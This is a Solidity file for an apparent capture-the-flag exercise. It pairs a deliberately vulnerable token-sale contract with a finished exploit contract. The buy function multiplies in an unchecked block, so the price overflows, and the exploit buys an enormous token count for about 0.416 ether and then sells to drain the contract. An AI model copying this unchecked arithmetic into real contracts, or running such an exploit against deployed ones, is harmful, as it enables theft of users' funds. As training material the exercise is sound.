// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            //@audit why +=? why not just total = numTokens * PRICE_PER_TOKEN?
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    receive() external payable {}

    // write your exploit functions below
    // @solution: total can be overflow
    function exploit() public {
        uint256 numTokens = type(uint256).max / 1 ether + 1;
        // console.log("numTokens", numTokens);  115792089237316195423570985008687907853269984665640564039458

        uint256 total;
        unchecked {
          total = numTokens * 1 ether;
          // console.log("total", total); 415992086870360064
          // Why is the overflow not just 1 wei?
        }

        tokenSale.buy{value: total}(numTokens);

        uint256 sellNumTokens = address(tokenSale).balance / 1e18;
        // console.log("sellNumTokens", sellNumTokens);
        // note: impossible to drain all balance, leaving 0.41 ether behind
        
        tokenSale.sell(sellNumTokens);
    }
}
